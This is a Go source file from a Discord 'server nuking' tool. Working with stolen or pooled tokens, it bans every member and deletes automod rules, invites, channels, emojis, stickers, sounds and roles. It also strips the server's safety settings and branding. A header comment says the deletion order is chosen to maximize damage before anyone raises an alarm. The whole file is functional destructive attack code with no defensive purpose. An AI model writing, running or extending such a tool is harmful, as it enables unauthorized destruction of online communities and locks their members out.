// Package nuke executes ordered deletion of everything in a guild.
// Order maximizes damage before alarm and skips redundant work
// (e.g. channel deletion cascades webhooks + messages).
package nuke

import (
	"context"
	"sync"

	"github.com/M1noa/wrack/api"
	"github.com/M1noa/wrack/recon"
	"github.com/M1noa/wrack/token"
	"github.com/M1noa/wrack/ui"
)

// Config controls which phases run.
type Config struct {
	GuildID    string
	Ban        bool // ban all members
	Kick       bool // kick instead of ban (if Ban is false)
	DeleteSecs int  // message-deletion window for bans (max 604800)
	SkipBans   bool // don't ban at all (e.g. --no-ban)
}

// Engine fans out destructive jobs across tokens.
type Engine struct {
	Cfg     *Config
	Pool    *token.Pool
	Snap    *recon.Snapshot
	Created map[string]bool // IDs created by us; never delete these in monitor.
	ctx     context.Context
	mu      sync.Mutex
}

// New builds a Nuke engine.
func New(cfg *Config, pool *token.Pool, snap *recon.Snapshot) *Engine {
	return &Engine{Cfg: cfg, Pool: pool, Snap: snap, Created: make(map[string]bool)}
}

// TrackCreated records an object we made so we skip it later.
func (e *Engine) TrackCreated(id string) {
	e.mu.Lock()
	e.Created[id] = true
	e.mu.Unlock()
}

func (e *Engine) ours(id string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.Created[id]
}

// Run fires all deletion phases in order.
func (e *Engine) Run(ctx context.Context) error {
	e.ctx = ctx
	const reason = "wrack"

	// 1. Bulk ban everyone first (locks out reaction).
	if !e.Cfg.SkipBans && e.Cfg.Ban {
		e.banEveryone(ctx, reason)
	}

	// 2. Delete automod rules (before channels so automod can't interfere).
	e.forEachTokenParallel(func(t *token.Token) {
		for _, rule := range e.Snap.AutoMod {
			if err := t.Client.DeleteAutoModRule(ctx, e.Cfg.GuildID, rule.ID, reason); err == nil {
				ui.Dim("  - automod %s", rule.Name)
			}
		}
	})

	// 3. Revoke invites.
	e.forEachTokenParallel(func(t *token.Token) {
		for _, inv := range e.Snap.Invites {
			if err := t.Client.DeleteInvite(ctx, inv.Code, reason); err == nil {
				ui.Dim("  - invite %s", inv.Code)
			}
		}
	})

	// 4. Delete webhooks that aren't channel-cascade-covered (rare; usually skipped).
	// Channel deletion cascades them — only clean up orphans if any remain.

	// 5. Channels + categories.
	var chans []api.Channel
	chans = append(chans, e.Snap.Categories...)
	chans = append(chans, e.Snap.TextVoice...)
	p := &ui.Progress{Label: "channels", Total: int64(len(chans))}
	fanOut(e, chans, func(t *token.Token, ch api.Channel) {
		if err := t.Client.DeleteChannel(ctx, ch.ID, reason); err == nil {
			p.Tick(1)
		}
	})
	p.Finish()

	// 6. Emojis.
	p = &ui.Progress{Label: "emojis", Total: int64(len(e.Snap.Emojis))}
	fanOut(e, e.Snap.Emojis, func(t *token.Token, em api.Emoji) {
		if err := t.Client.DeleteEmoji(ctx, e.Cfg.GuildID, em.ID, reason); err == nil {
			p.Tick(1)
		}
	})
	p.Finish()

	// 7. Stickers.
	p = &ui.Progress{Label: "stickers", Total: int64(len(e.Snap.Stickers))}
	fanOut(e, e.Snap.Stickers, func(t *token.Token, st api.Sticker) {
		if err := t.Client.DeleteSticker(ctx, e.Cfg.GuildID, st.ID, reason); err == nil {
			p.Tick(1)
		}
	})
	p.Finish()

	// 8. Soundboard sounds.
	p = &ui.Progress{Label: "sounds", Total: int64(len(e.Snap.Sounds))}
	fanOut(e, e.Snap.Sounds, func(t *token.Token, snd api.SoundboardSound) {
		if err := t.Client.DeleteSound(ctx, e.Cfg.GuildID, snd.SoundID, reason); err == nil {
			p.Tick(1)
		}
	})
	p.Finish()

	// 9. Roles (skip @everyone + managed).
	var deletable []api.Role
	for _, r := range e.Snap.Roles {
		if r.ID != e.Cfg.GuildID && !r.Managed {
			deletable = append(deletable, r)
		}
	}
	p = &ui.Progress{Label: "roles", Total: int64(len(deletable))}
	fanOut(e, deletable, func(t *token.Token, r api.Role) {
		if err := t.Client.DeleteRole(ctx, e.Cfg.GuildID, r.ID, reason); err == nil {
			p.Tick(1)
		}
	})
	p.Finish()

	return nil
}

// StripSettings wipes guild settings to permissive defaults + clears branding.
func (e *Engine) StripSettings(ctx context.Context) {
	body := map[string]any{
		"verification_level":            0,
		"default_message_notifications": 1,
		"explicit_content_filter":       0,
		"afk_timeout":                   60,
		"system_channel_id":             nil,
		"rules_channel_id":              nil,
		"public_updates_channel_id":     nil,
		"icon":                          nil,
		"banner":                        nil,
		"splash":                        nil,
		"discovery_splash":              nil,
		"description":                   "",
		"premium_progress_bar_enabled":  false,
		// Best-effort server tag (not officially writable via PATCH /guilds;
		// Discord may 400 this field — we ignore errors silently).
		"tag": "",
	}
	t := e.Pool.Next()
	if t == nil {
		return
	}
	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err == nil {
		ui.Ok("guild settings stripped")
	} else {
		// Retry without tag in case it 400'd on that field alone.
		delete(body, "tag")
		if _, err2 := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err2 == nil {
			ui.Ok("guild settings stripped")
		} else {
			ui.Err("guild settings: %v", err2)
		}
	}

	// Disable onboarding + welcome screen + membership screening (server rules).
	for _, t := range e.Pool.WithPerm(api.PermManageGuild, api.PermManageRoles) {
		if err := t.Client.SetOnboarding(ctx, e.Cfg.GuildID, false, "wrack"); err == nil {
			ui.Ok("onboarding disabled")
			break
		}
	}
	for _, t := range e.Pool.WithPerm(api.PermManageGuild) {
		if err := t.Client.SetWelcomeScreen(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
			ui.Ok("welcome screen disabled")
			break
		}
	}
	for _, t := range e.Pool.WithPerm(api.PermManageGuild) {
		if err := t.Client.SetMemberVerification(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
			ui.Ok("membership screening disabled")
			break
		}
	}
}

// SetShortMessage applies --short to bio / tag / rules description.
func (e *Engine) SetShortMessage(ctx context.Context, short string) {
	if short == "" {
		return
	}
	tag := short
	if len(tag) > 4 {
		tag = tag[:4]
	}
	bio := short
	if len(bio) > 300 {
		bio = bio[:300]
	}
	body := map[string]any{"description": bio, "tag": tag}
	t := e.Pool.Next()
	if t == nil {
		return
	}
	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err == nil {
		ui.Ok("bio + tag set")
	} else {
		delete(body, "tag")
		if _, err2 := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err2 == nil {
			ui.Ok("bio set (tag not writable)")
		} else {
			ui.Err("bio/tag: %v", err2)
		}
	}
	for _, tk := range e.Pool.WithPerm(api.PermManageGuild) {
		if err := tk.Client.SetMemberVerification(ctx, e.Cfg.GuildID, true, short, "wrack"); err == nil {
			ui.Ok("server rules text set")
			break
		}
	}
}

// banEveryone shards the member list into bulk-ban chunks across tokens.
func (e *Engine) banEveryone(ctx context.Context, reason string) {
	bulkTokens := e.Pool.WithPerm(api.PermBanMembers, api.PermManageGuild)
	singleTokens := e.Pool.WithPerm(api.PermBanMembers)
	if len(singleTokens) == 0 && len(bulkTokens) == 0 {
		ui.Warn("no tokens with BAN_MEMBERS; skipping ban phase")
		return
	}

	// Build user list from snapshot members.
	var ids []string
	for _, m := range e.Snap.Members {
		if m.User == nil || m.User.Bot {
			continue
		}
		ids = append(ids, m.User.ID)
	}
	if len(ids) == 0 {
		ui.Dim("no members to ban (or member fetch failed)")
		return
	}

	p := &ui.Progress{Label: "banning", Total: int64(len(ids))}

	if len(bulkTokens) > 0 {
		// Shard into 200-chunks, assign round-robin to bulk-capable tokens.
		chunks := chunk(ids, 200)
		sem := make(chan struct{}, len(bulkTokens))
		var wg sync.WaitGroup
		i := 0
		for _, ch := range chunks {
			wg.Add(1)
			go func(chunk []string, idx int) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				t := bulkTokens[idx%len(bulkTokens)]
				if _, _, err := t.Client.BulkBan(ctx, e.Cfg.GuildID, chunk, e.Cfg.DeleteSecs); err == nil {
					p.Tick(int64(len(chunk)))
				} else {
					// Fallback: single-ban each.
					for _, uid := range chunk {
					st := pickSingle(singleTokens)
					if st != nil {
						if err := st.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, reason); err == nil {
								p.Tick(1)
							}
						}
					}
				}
			}(ch, i)
			i++
		}
		wg.Wait()
	} else {
		// Single-ban path only.
		sem := make(chan struct{}, len(singleTokens)*3)
		var wg sync.WaitGroup
		for _, uid := range ids {
			wg.Add(1)
			go func(uid string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				t := pickSingle(singleTokens)
				if t != nil {
					if err := t.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, reason); err == nil {
						p.Tick(1)
					}
				}
			}(uid)
		}
		wg.Wait()
	}
	p.Finish()
}

func pickSingle(tokens []*token.Token) *token.Token {
	if len(tokens) == 0 {
		return nil
	}
	return tokens[0] // TODO round-robin
}

// forEachTokenParallel runs fn for every usable token concurrently.
func (e *Engine) forEachTokenParallel(fn func(*token.Token)) {
	var wg sync.WaitGroup
	for _, t := range e.Pool.Tokens {
		if !t.InGuild || len(t.Errors) > 0 {
			continue
		}
		wg.Add(1)
		go func(tk *token.Token) {
			defer wg.Done()
			fn(tk)
		}(t)
	}
	wg.Wait()
}

// fanOut distributes items across tokens. Each token gets a shard and
// processes it sequentially (per-token rate buckets stay happy). Concurrency
// is bounded by token count.
func fanOut[T any](e *Engine, items []T, fn func(*token.Token, T)) {
	if len(items) == 0 {
		return
	}
	tokens := usable(e)
	if len(tokens) == 0 {
		return
	}
	shards := token.Shard(items, len(tokens))
	var wg sync.WaitGroup
	for i, sh := range shards {
		wg.Add(1)
		go func(shard []T, t *token.Token) {
			defer wg.Done()
			for _, item := range shard {
				select {
				case <-e.ctx.Done():
					return
				default:
				}
				fn(t, item)
			}
		}(sh, tokens[i])
	}
	wg.Wait()
}

// usable returns tokens that are in-guild with no errors.
func usable(e *Engine) []*token.Token {
	var out []*token.Token
	for _, t := range e.Pool.Tokens {
		if t.InGuild && len(t.Errors) == 0 {
			out = append(out, t)
		}
	}
	return out
}

// chunk splits ids into n-sized chunks.
func chunk(ids []string, n int) [][]string {
	out := make([][]string, 0, (len(ids)+n-1)/n)
	for i := 0; i < len(ids); i += n {
		end := i + n
		if end > len(ids) {
			end = len(ids)
		}
		out = append(out, ids[i:end])
	}
	return out
}

var _ = sync.Mutex{} // keep sync import
